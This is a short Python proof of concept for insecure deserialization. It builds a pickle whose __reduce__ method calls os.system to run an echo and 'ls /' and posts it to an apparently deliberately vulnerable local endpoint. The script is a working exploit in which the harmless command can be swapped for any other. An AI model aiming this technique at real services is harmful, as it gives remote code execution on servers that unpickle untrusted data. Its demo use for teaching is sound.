import pickle, os, requests

# Create a malicious pickle that executes a harmless command on unpickle for demo
# WARNING: Only for controlled demo on local dev - never send to unknown endpoints.
class Evil(object):
    def __reduce__(self):
        import os
        return (os.system, ("echo 'Evil executed: listing /' && ls /",))

payload = pickle.dumps(Evil())

resp = requests.post("http://127.0.0.1:5000/vuln/unpickle", data=payload, headers={"Content-Type":"application/octet-stream"})
print(resp.status_code, resp.text)

